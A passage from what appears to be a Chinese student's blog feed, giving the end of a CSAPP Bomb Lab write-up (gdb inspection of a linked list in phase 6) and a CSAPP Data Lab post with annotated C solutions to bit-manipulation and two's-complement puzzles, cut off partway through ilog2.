<p>这个程序跳转非常多，看了一部分就看晕了，于是上网搜了下答案。 其中有一个地址<code>0x6032d0</code> 把其中内容打印出来看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/24 0x6032d0</span><br><span class="line">0x6032d0 &lt;node1&gt;:	0x0000014c	0x00000001	0x006032e0	0x00000000</span><br><span class="line">0x6032e0 &lt;node2&gt;:	0x000000a8	0x00000002	0x006032f0	0x00000000</span><br><span class="line">0x6032f0 &lt;node3&gt;:	0x0000039c	0x00000003	0x00603300	0x00000000</span><br><span class="line">0x603300 &lt;node4&gt;:	0x000002b3	0x00000004	0x00603310	0x00000000</span><br><span class="line">0x603310 &lt;node5&gt;:	0x000001dd	0x00000005	0x00603320	0x00000000</span><br><span class="line">0x603320 &lt;node6&gt;:	0x000001bb	0x00000006	0x00000000	0x00000000</span><br></pre></td></tr></table></figure></p>
<p>发现是一个结构体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct &#123;</span><br><span class="line">	int value;</span><br><span class="line">	int order;</span><br><span class="line">	node* next;</span><br><span class="line">&#125;node;</span><br></pre></td></tr></table></figure></p>
<p>程序实现的是正确的order使得这个链表从大到小排序。另外由于+108 到+121部分把我们输入的数字都进行了a= 7 - a的操作所以，链表从大到小的order应该是 3 4 5 6 1 2 那么我们输入的应该是4 3 2 1 6 5。</p>
<hr>
<p>至此这个实验就全部完成了，感受是汇编是真的难读啊= = 果然不是给人看的。通过这个实验了解了机器是如何实现流程控制、过程调用的，也算是重温了一下汇编语言。 其中我觉得比较难掌握的地方是函数调用的部分。</p>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAPP-Data Lab]]></title>
      <url>/2018/01/19/CSAPP/Data_Lab/</url>
      <content type="html"><![CDATA[<p>第一个实验主要分为三个部分，比特操作、整数运算、浮点数运算。 第一个实验就给我来了个下马威，前后花了快两天才把这些都做出来，CMU果然名不虚传啊</p>
<a id="more"></a>
<h1 id="Bit-Manipulations"><a href="#Bit-Manipulations" class="headerlink" title="Bit Manipulations"></a>Bit Manipulations</h1><h2 id="bitAnd"><a href="#bitAnd" class="headerlink" title="bitAnd"></a>bitAnd</h2><p>实现两个数的按位与，要求只能使用 ~ | 操作符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitAnd - x&amp;y using only ~ and | </span></span><br><span class="line"><span class="comment"> *   Example: bitAnd(6, 5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ |</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitAnd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ~ ( (~x) | (~y) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比较简单，使用了地摩根定律</p>
<h2 id="getByte"><a href="#getByte" class="headerlink" title="getByte"></a>getByte</h2><p>从word 中取出某一byte， eg: <code>getByte(0x12345678, 1) = 0x56</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * getByte - Extract byte n from word x</span></span><br><span class="line"><span class="comment"> *   Bytes numbered from 0 (LSB) to 3 (MSB)</span></span><br><span class="line"><span class="comment"> *   Examples: getByte(0x12345678,1) = 0x56</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 6</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getByte</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"> 	<span class="keyword">int</span> rdis = n&lt;&lt;<span class="number">3</span>;</span><br><span class="line"> 	<span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"> 	ans = (x&gt;&gt;rdis) &amp; <span class="number">0xff</span>;</span><br><span class="line"> 	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个byte是8bit, 所以先右移8n（<code>n&lt;&lt;3</code>）位，再用0x000000ff 这样一个常数来mask，即只取最后8bit</p>
<h2 id="logitcalShift"><a href="#logitcalShift" class="headerlink" title="logitcalShift"></a>logitcalShift</h2><p>实现对整数的逻辑右移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalShift - shift x to the right by n, using a logical shift</span></span><br><span class="line"><span class="comment"> *   Can assume that 0 &lt;= n &lt;= 31</span></span><br><span class="line"><span class="comment"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 20</span></span><br><span class="line"><span class="comment"> *   Rating: 3 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">logicalShift</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// x + (~x) == -1</span></span><br><span class="line">	<span class="keyword">int</span> ones =  (<span class="number">1</span>  &lt;&lt; n) + (<span class="number">1</span>  + (~<span class="number">1</span>));</span><br><span class="line"> 	<span class="keyword">int</span> mask = ~ (ones &lt;&lt; (<span class="number">32</span> + <span class="number">1</span> + ~n) );</span><br><span class="line">	<span class="keyword">return</span> (x &gt;&gt; n) &amp;  mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>C中默认的&gt;&gt;是算术右移， 这里考虑到算数右移和逻辑右移的区别就在于<strong>逻辑右移补填充而算数右移填充符号位</strong>， 所以只需要构造一个mask去和算数位移的结果取交就可以了。 这个mask前面n位是1，后面全是0； 因为不能用减号，<del>所以利用 <code>x+(~x) == -1</code>的性质。</del> 是我傻，可以用<code>~0 == -1</code><br>eg.  logicalShift(0x87654321,4)</p>
<ol>
<li>ones := （1 &lt;&lt; 4 ） - 1  得到ones为<code>0b10000 - 1 = 0b1111</code> </li>
<li>拿到<code>0b1111</code>之后需要把它左移到这32位整数的最左边四位去，这里需要左移的位数是32-n, 因为不能用减号，所以把-n替换成<code>1+~n</code>。 这样左移之后再取反就得到了我们想要的mask  ： <code>00001111 11111111 11111111 11111111</code> </li>
<li>把x算数右移的结果和mask相与就得到了逻辑右移的结果</li>
</ol>
<h2 id="bitCount"><a href="#bitCount" class="headerlink" title="bitCount"></a>bitCount</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitCount - returns count of number of 1's in word</span></span><br><span class="line"><span class="comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 40</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>这道题感觉是最难的一道，如果让我用if的话还知道怎么做，这样子一点思路的没有。 后来上网搜了一下，使用分而治之的方法</p>
<p>假设我们有2bit数，想得到其中的1的个数: (x &amp; 1) + (x &gt;&gt; 1) &amp; 1<br>假设我们有4bit数，想得到其中的1的个数: (x &amp; 1) + (x &gt;&gt; 1) &amp; 1 + (x&gt;&gt;2 &amp; 1) + (x&gt;&gt;2 &gt;&gt; 1) &amp; 1<br>假设我们有32bit，就可以把它们分成16组，但是因为有maxOPs限制所以不能这么做</p>
<p>所以再次考虑4bit的情况，我们是否可以把两部分操作合并呢？</p>
<ol>
<li>x = (x &amp; 0b0101) + ((x&gt;&gt;1) &amp; 0b0101) 这一步把4bit分成两部分处理，分别把第1、2位的bit1的个数和放在了第1 2位上，把第3、4位的bit1的个数和放在了第34位上 （eg: 0101 经过这步操作之后是0101， 0111→ 0110, 1111→ 1010）</li>
<li>(x &amp; 0b0011) + ((x &gt;&gt; 2) &amp; 0b0011) 这一步把12 位上存放的结果与3、4位上存放的结果相加，则最终结果就是这个4bit数中1的个数</li>
</ol>
<p>把这个方法推广到32位。 则我们需要几个mask</p>
<p>01010101 01010101 01010101 01010101<br>00110011 00110011 00110011 00110011<br>00001111 00001111 00001111 00001111<br>00000000 11111111 00000000 11111111<br>00000000 00000000 11111111 11111111</p>
<p>最终的代码是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitCount</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> _mask1 = (<span class="number">0x55</span>) | (<span class="number">0x55</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">  <span class="keyword">int</span> mask1 = _mask1 | (_mask1&lt;&lt;<span class="number">16</span>); <span class="comment">//01010101 * 4</span></span><br><span class="line">  <span class="keyword">int</span> _mask2 = (<span class="number">0x33</span>) | (<span class="number">0x33</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">  <span class="keyword">int</span> mask2 = _mask2 | (_mask2&lt;&lt;<span class="number">16</span>); <span class="comment">//00110011 * 4</span></span><br><span class="line">  <span class="keyword">int</span> _mask3 = (<span class="number">0x0f</span>) | (<span class="number">0x0f</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">  <span class="keyword">int</span> mask3 = _mask3 | (_mask3&lt;&lt;<span class="number">16</span>); <span class="comment">//00001111 * 4</span></span><br><span class="line">  <span class="keyword">int</span> mask4 = <span class="number">0xff</span> | (<span class="number">0xff</span>&lt;&lt;<span class="number">16</span>); <span class="comment">//00000000 11111111 * 2</span></span><br><span class="line">  <span class="keyword">int</span> mask5 = <span class="number">0xff</span> | (<span class="number">0xff</span>&lt;&lt;<span class="number">8</span>); <span class="comment">//00000000 00000000 11111111 11111111</span></span><br><span class="line"></span><br><span class="line">  x = (x &amp; mask1) + ( (x&gt;&gt;<span class="number">1</span>) &amp; mask1);</span><br><span class="line">  x = (x &amp; mask2) + ( (x&gt;&gt;<span class="number">2</span>) &amp; mask2);</span><br><span class="line">  x = (x &amp; mask3) + ( (x&gt;&gt;<span class="number">4</span>) &amp; mask3);</span><br><span class="line">  x = (x &amp; mask4) + ( (x&gt;&gt;<span class="number">8</span>) &amp; mask4);</span><br><span class="line">  x = (x &amp; mask5) + ( (x&gt;&gt;<span class="number">16</span>) &amp; mask5);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>eg:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">So if I have number 395 in binary 0000000110001011 (0 0 0 0 0 0 0 1 1 0 0 0 1 0 1 1)</span><br><span class="line">After the first step I have:      0000000101000110 (0+0 0+0 0+0 0+1 1+0 0+0 1+0 1+1) = 00 00 00 01 01 00 01 10</span><br><span class="line">In the second step I have:        0000000100010011 ( 00+00   00+01   01+00   01+10 ) = 0000 0001 0001 0011</span><br><span class="line">In the fourth step I have:        0000000100000100 (   0000+0001       0001+0011   ) = 00000001 00000100</span><br><span class="line">In the last step I have:          0000000000000101 (       00000001+00000100       )</span><br></pre></td></tr></table></figure></p>
<h2 id="bang"><a href="#bang" class="headerlink" title="bang"></a>bang</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bang - Compute !x without using !</span></span><br><span class="line"><span class="comment"> *   Examples: bang(3) = 0, bang(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>其实就是判断X是否为0，考虑到0的一个特殊性，0和-0的符号位都是0，而其他任何一个整数x， x和-x符号位肯定有一个是1，一个是0。所以这里就等价于取x和-x最高位的异或</p>
<ol>
<li>首先计算由x、-x最高位组成的32位整数，将两个数取或，则对于0来说，结果全都为0, 而对于非0的数来说结果全都是1</li>
<li>然后再将上面得到的highest先取反，再与1取交，则任何非零的数都会得到0的结果，而0则会得到1的结果</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> highest = (x &gt;&gt; <span class="number">31</span>) | ( ( (~x)+<span class="number">1</span>) &gt;&gt;  <span class="number">31</span>);</span><br><span class="line">	<span class="keyword">int</span> mask =  <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> ~highest &amp; mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>eg:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">对于0来说：</span><br><span class="line">highest = 00000000 00000000 00000000 00000000</span><br><span class="line">mask    = 00000000 00000000 00000000 00000001</span><br><span class="line">result  = ~highest &amp; mask = 1</span><br><span class="line">对于3 （或-3）来说:</span><br><span class="line">highest = 00000000 00000000 00000000 00000000 | 11111111 ....</span><br><span class="line">        = 11111111 11111111 11111111 11111111</span><br><span class="line">mask    = 00000000 00000000 00000000 00000001</span><br><span class="line">result  = ~highest &amp; mask = 0</span><br></pre></td></tr></table></figure></p>
<h1 id="Two’s-Complement-Arithmetic"><a href="#Two’s-Complement-Arithmetic" class="headerlink" title="Two’s Complement Arithmetic"></a>Two’s Complement Arithmetic</h1><h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><p>这个很简单，32位整数能表示的最小整数就是 - 2 ^ 31， 但是利用2s complement 可以用1&lt;&lt;31 来表示 -2 ^ 31因为第一位是负的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two's complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="comment">// 下面这个写法说明还是没有理解2s complement啊</span></span><br><span class="line">  <span class="comment">// return ~(1 &lt;&lt; 31) + 1;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="fitsBits"><a href="#fitsBits" class="headerlink" title="fitsBits"></a>fitsBits</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * fitsBits - return 1 if x can be represented as an </span></span><br><span class="line"><span class="comment"> *  n-bit, two's complement integer.</span></span><br><span class="line"><span class="comment"> *   1 &lt;= n &lt;= 32</span></span><br><span class="line"><span class="comment"> *   Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>一开始想到方法是计算出nbit数字可以表示的最大整数和最小整数，再判断x和tmin tmax的大小，但是这种方法会超过Maxops<br>。这里可以注意到 所有满足可以用n bit表示的整数都有一个性质</p>
<ul>
<li>正数，如果可以用n bit来表示，则第n位一定是0，即第n位到第32位一定都是0,（否则如果第n位是1的话，用n bit来表示是负数)</li>
<li>负数，如果可以用n bit来表示，则第n位一定是1</li>
</ul>
<p>所以借助这两个性质，我们先把x进行右移n-1位，那么对于满足条件的Integer要么全是0，要么全是1。 给得到的数加一再左移一位，则会得到全0的数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fitsBits</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> !(((x &gt;&gt; (n + ~<span class="number">0</span>)) + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="divpwr2"><a href="#divpwr2" class="headerlink" title="divpwr2"></a>divpwr2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span></span><br><span class="line"><span class="comment"> *  Round toward zero</span></span><br><span class="line"><span class="comment"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>移位运算都是向下取整，而我们想要的是正数向下取整, 负数向上取整。我们拿几个数试试也可以发现，</p>
<ul>
<li><p>正数：直接使用算术右移即可</p>
</li>
<li><p>负数：在算术右移的基础上，要判断是否有余数，如果有余数则需要加上1</p>
</li>
</ul>
<p>这里判断x是否为负数 用 (x &gt;&gt; 31) &amp; 1 即可得到x的符号位，x为负数时值位1, x为正数时值位0。 factor计算的是x的第1到第n位是否有比特1的出现，也就是是否会出现余数，如果有则x除以2的n次方不是整除，则需要给结果加上1（因为是round toward zero) , 这里使用!!x 把x映射为0或1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divpwr2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">int</span> isNegative = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">int</span> factor = !!(((<span class="number">1</span> &lt;&lt; n) + ~<span class="number">0</span>) &amp; x);</span><br><span class="line">   <span class="keyword">return</span> (x&gt;&gt;n) + (isNegative &amp; factor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><p>昙花一现的简单题。。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (~x) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="isPositive"><a href="#isPositive" class="headerlink" title="isPositive"></a>isPositive</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isPositive - return 1 if x &gt; 0, return 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Example: isPositive(-1) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>这个也不是很难啦，因为(x&gt;&gt;31) &amp; 1 就可以判断x的符号，而!x可以判断x是不是0。 正数 = 既不是负数又不是0的数。不过需要注意的是，这里如果用<code>((~x + 1) &gt;&gt; 31 ) &amp; 1</code>会出现的问题是 当x = 0x80000000 (-2^31) 时 , ((~x + 1) &gt;&gt; 31) &amp; 1得到结果是1，所以会出错，因为正数和负数的范围是不对称的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isPositive</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 此方法对于x = -2**31的时候会溢出</span></span><br><span class="line">   <span class="comment">// return ((1 + (~x)) &gt;&gt; 31 ) &amp; 1;</span></span><br><span class="line">   <span class="keyword">int</span> isNegative = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">int</span> isZero = !x;</span><br><span class="line">   <span class="keyword">return</span> !isZero &amp; !isNegative;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>刚拿到这个的时候我的想法是判断x-y的符号，但是这样会有溢出的问题。 正确的做法是分成x y同符号和x y 不同符号两种情况来做。符号相同则比较数值大小，符号不同则是x为负y为正时满足x&gt;=y</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sign_x = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> sign_y = y &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="comment">// 如果xy符号相同 x &lt;= y 等价于 x-y-1 &lt; 0 即 x + ~y &gt;&gt; 31</span></span><br><span class="line">  <span class="keyword">int</span> equal = (!(sign_x ^ sign_y)) &amp; ((~y + x) &gt;&gt; <span class="number">31</span>);</span><br><span class="line">  <span class="comment">// 如果符号不同 x &lt;= y 等价于 sign_x &amp; !sign_y</span></span><br><span class="line">  <span class="keyword">int</span> notEqual = (sign_x ^ sign_y) &amp; sign_x  &amp; !sign_y;</span><br><span class="line">  <span class="keyword">return</span> equal | notEqual;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ilog2"><a href="#ilog2" class="headerlink" title="ilog2"></a>ilog2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span></span><br><span class="line"><span class="comment"> *   Example: ilog2(16) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 90+ *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>这题很有意思。对x取log并向下取整， 实际上就是在找x中最高位1的在哪里。 因为x是32位整数，则取log得到的范围是(0, 32]。 所以可以把结果ans用二进制表示为 ans = 16a + 8b + 4c + 2d +e 然后依次求abcde的值</p>
<ul>
<li><p>第一步求a， 对x右移16位，判断是否为0， 如果x的第17 -32 位全都位0的话 ，a应该为0, ans =0, 否则a=1 ans=16</p>
</li>
<li><p>第二步求b， 对x右移8 + ans位（&gt;&gt;8+ans）</p>
</li>
<li><p>如果上一步中得到的ans = 16， 则需要判断ans是在[16, 24)区间内还是[24, 32]区间内， 将x右移24位，判断x的25 - 32位是否包含1，如果不包含1 说明x 是小于2^24的，则b=0 , ans = 16 +0 ； 反之如果包含1 说明x是大于2^24的，b=1， ans = 16+ 8 24</p>
</li>
